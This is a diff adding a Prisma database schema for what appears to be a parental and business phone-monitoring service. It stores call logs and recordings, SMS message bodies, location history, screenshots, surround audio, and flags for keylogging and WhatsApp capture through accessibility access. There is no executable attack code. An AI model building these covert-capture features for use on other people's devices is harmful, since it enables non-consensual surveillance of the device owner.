@@ -1,0 +1,250 @@
+datasource db {
+  provider = "postgresql"
+  url      = env("DATABASE_URL")
+}
+
+generator client {
+  provider = "prisma-client-js"
+}
+
+enum AccountType {
+  PARENT
+  BUSINESS
+  ADMIN
+}
+
+enum UserRole {
+  FAMILY_PARENT
+  ORGANIZATION_ADMIN
+  ORGANIZATION_MANAGER
+  SUPER_ADMIN
+  SUPPORT_AGENT
+  BILLING_MANAGER
+}
+
+enum CollectionMethod {
+  android_api
+  notification
+  accessibility
+  media
+  device_policy
+  user_action
+}
+
+enum AudioCaptureMode {
+  two_way_hardware
+  mic_fallback
+  surround_only
+  unsupported
+}
+
+model User {
+  id             String        @id @default(uuid())
+  email          String        @unique
+  passwordHash   String
+  name           String
+  accountType    AccountType
+  roles          UserRole[]
+  familyId       String?
+  family         Family?       @relation(fields: [familyId], references: [id])
+  organizationId String?
+  organization   Organization? @relation(fields: [organizationId], references: [id])
+  createdAt      DateTime      @default(now())
+  updatedAt      DateTime      @updatedAt
+  auditLogs      AuditLog[]
+
+  @@index([familyId])
+  @@index([organizationId])
+}
+
+model Family {
+  id        String   @id @default(uuid())
+  name      String
+  members   User[]
+  devices   Device[]
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+}
+
+model Organization {
+  id        String   @id @default(uuid())
+  name      String
+  members   User[]
+  devices   Device[]
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+}
+
+model Device {
+  id             String             @id @default(uuid())
+  name           String
+  pairingCode    String?
+  isPaired       Boolean            @default(false)
+  androidVersion Int
+  sdkInt         Int
+  manufacturer   String
+  model          String
+  familyId       String?
+  family         Family?            @relation(fields: [familyId], references: [id])
+  organizationId String?
+  organization   Organization?      @relation(fields: [organizationId], references: [id])
+  capabilities   CapabilityMatrix?
+  events         NormalizedEvent[]
+  callLogs       CallLog[]
+  smsLogs        SmsLog[]
+  locations      LocationLog[]
+  mediaAssets    MediaAsset[]
+  appRules       AppRestriction[]
+  webRules       WebFilterRule[]
+  geofences      GeofenceRule[]
+  lastSeenAt     DateTime           @default(now())
+  createdAt      DateTime           @default(now())
+  updatedAt      DateTime           @updatedAt
+
+  @@index([familyId])
+  @@index([organizationId])
+}
+
+model CapabilityMatrix {
+  id                    String           @id @default(uuid())
+  deviceId              String           @unique
+  device                Device           @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  location              Boolean          @default(true)
+  callLogs              Boolean          @default(true)
+  sms                   Boolean          @default(true)
+  contacts              Boolean          @default(true)
+  appUsage              Boolean          @default(true)
+  keylogger             Boolean          @default(false)
+  screenshots           Boolean          @default(false)
+  audioCaptureMode      AudioCaptureMode @default(surround_only)
+  whatsappNotifications Boolean          @default(true)
+  whatsappAccessibility Boolean          @default(false)
+  whatsappMedia         Boolean          @default(true)
+  deviceOwnerMode       Boolean          @default(false)
+  updatedAt             DateTime         @updatedAt
+}
+
+model NormalizedEvent {
+  id               String           @id @default(uuid())
+  eventId          String           @unique
+  deviceId         String
+  device           Device           @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  source           String
+  eventType        String
+  timestamp        DateTime
+  collectionMethod CollectionMethod
+  payload          Json
+  createdAt        DateTime         @default(now())
+
+  @@index([deviceId, timestamp])
+  @@index([source])
+}
+
+model CallLog {
+  id          String   @id @default(uuid())
+  deviceId    String
+  device      Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  phoneNumber String
+  contactName String?
+  direction   String   // INCOMING, OUTGOING, MISSED
+  durationSec Int
+  timestamp   DateTime
+  recordingId String?
+  createdAt   DateTime @default(now())
+
+  @@index([deviceId, timestamp])
+}
+
+model SmsLog {
+  id          String   @id @default(uuid())
+  deviceId    String
+  device      Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  phoneNumber String
+  contactName String?
+  body        String
+  direction   String   // INCOMING, OUTGOING
+  timestamp   DateTime
+  createdAt   DateTime @default(now())
+
+  @@index([deviceId, timestamp])
+}
+
+model LocationLog {
+  id        String   @id @default(uuid())
+  deviceId  String
+  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  latitude  Float
+  longitude Float
+  accuracy  Float
+  speed     Float?
+  timestamp DateTime
+  createdAt DateTime @default(now())
+
+  @@index([deviceId, timestamp])
+}
+
+model MediaAsset {
+  id          String   @id @default(uuid())
+  deviceId    String
+  device      Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  category    String   // PHOTO, SCREENSHOT, VOICE_NOTE, CALL_RECORDING, SURROUND
+  storageKey  String
+  fileHash    String
+  fileSizeBytes Int
+  mimeType    String
+  timestamp   DateTime
+  createdAt   DateTime @default(now())
+
+  @@index([deviceId, category])
+}
+
+model AppRestriction {
+  id                    String   @id @default(uuid())
+  deviceId              String
+  device                Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  packageName           String
+  appName               String
+  isBlocked             Boolean  @default(false)
+  dailyTimeLimitMinutes Int?
+  updatedAt             DateTime @updatedAt
+
+  @@unique([deviceId, packageName])
+}
+
+model WebFilterRule {
+  id          String   @id @default(uuid())
+  deviceId    String
+  device      Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  domainOrUrl String
+  category    String?
+  action      String   // ALLOW, BLOCK
+  updatedAt   DateTime @updatedAt
+
+  @@unique([deviceId, domainOrUrl])
+}
+
+model GeofenceRule {
+  id           String   @id @default(uuid())
+  deviceId     String
+  device       Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  name         String
+  latitude     Float
+  longitude    Float
+  radiusMeters Float
+  alertOnEntry Boolean  @default(true)
+  alertOnExit  Boolean  @default(true)
+  updatedAt    DateTime @updatedAt
+}
+
+model AuditLog {
+  id        String   @id @default(uuid())
+  userId    String?
+  user      User?    @relation(fields: [userId], references: [id])
+  action    String
+  resource  String
+  details   Json?
+  ipAddress String?
+  createdAt DateTime @default(now())
+
+  @@index([createdAt])
+}
